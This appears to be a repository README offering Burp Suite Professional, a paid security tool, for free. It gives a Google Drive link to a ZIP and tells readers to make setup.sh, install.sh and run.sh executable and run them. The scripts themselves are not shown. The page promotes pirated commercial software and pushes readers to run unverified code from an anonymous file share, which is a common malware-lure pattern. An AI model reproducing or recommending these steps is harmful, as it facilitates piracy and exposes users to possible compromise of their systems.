# Burp Suite Professional

Welcome to the Burp Suite Professional repository. This repository provides the professional version of Burp Suite for free. Follow the instructions below to download and execute the files.

## Prerequisites

- Ensure you have the latest Java SDK installed on your system. You can download it from [Oracle's official website](https://www.oracle.com/java/technologies/javase-downloads.html) or use your package manager.

## Download

1. Click on the following link to access the Google Drive folder:
   [Download Burp Suite Professional](https://drive.google.com/drive/folders/1WNN7vJIKdUmzUHFv_2xBSdg9aPfSdYnc?usp=drive_link)

2. Download the file `Burp Suite Professional - 2024.zip` from the folder to your local machine.

## Installation and Execution

1. **Extract the ZIP File**:
   - Use your preferred file extraction tool to extract `Burp Suite Professional - 2024.zip`.
   - On Linux or macOS, you can use the terminal:
     ```sh
     unzip "Burp Suite Professional - 2024.zip"
     ```
   - On Windows, you can right-click the ZIP file and select "Extract All..."

2. **Navigate to the Extracted Directory**:
   - Open a terminal or command prompt and change to the directory where you extracted the files:
     ```sh
     cd "Burp Suite Professional - 2024"
     ```

3. **Execute the Files**:
   - Execute the files in the order specified below:

     1. **File 1**: `setup.sh`
        ```sh
        ./setup.sh
        ```

     2. **File 2**: `install.sh`
        ```sh
        ./install.sh
        ```

     3. **File 3**: `run.sh`
        ```sh
        ./run.sh
        ```

   (Repeat the above steps for all necessary files provided in the directory.)

## Notes

- Ensure you have the necessary permissions to execute the files. You might need to use `chmod` to make the files executable:
  ```sh
  chmod +x setup.sh install.sh run.sh
